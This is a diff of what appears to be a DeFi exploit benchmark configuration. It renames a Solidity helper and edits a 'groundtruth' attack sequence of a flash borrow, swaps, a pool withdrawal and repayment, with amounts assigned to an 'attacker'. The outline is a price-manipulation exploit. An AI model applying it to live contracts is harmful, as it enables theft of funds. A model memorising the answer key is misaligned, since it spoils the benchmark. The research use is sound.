@@ -26,7 +26,7 @@ extra_actions:
     btcb.approve(address(loan), type(uint256).max);
     loan.supply(address(btcb), amount);
   }"
-  - "function burn_lusd_lusdpool(uint256 amount) internal eurus {
+  - "function withdraw_lusdpool_lusd_usdt(uint256 amount) internal eurus {
     lusd.approve(address(lusdpool), type(uint256).max);
     lusdpool.withdraw(amount);
   }"
@@ -47,7 +47,7 @@ groundtruth:
   - ["borrow", "usdt", "owner", "980925 * 1e18"]
   - ["swap", "pairub", "attacker", "usdt", "btcb", "usdt.balanceOf(attacker) * 5/6", "1246953598313175025"]
   - ["swap", "loan", "attacker", "btcb", "lusd", "1515366635982742", "10000 * 1e18"]
-  - ["burn", "lusd", "lusdpool", "lusd.balanceOf(attacker)"]
+  - ["withdraw", "lusdpool", "lusd", "usdt", "lusd.balanceOf(attacker)"]
   - ["swap", "pairub", "attacker", "btcb", "usdt", "btcb.balanceOf(attacker)", "pairub.getAmountOut(btcb.balanceOf(attacker), address(btcb))"]
   - ["payback", "usdt", "owner", "980925 * 1e18"]
 
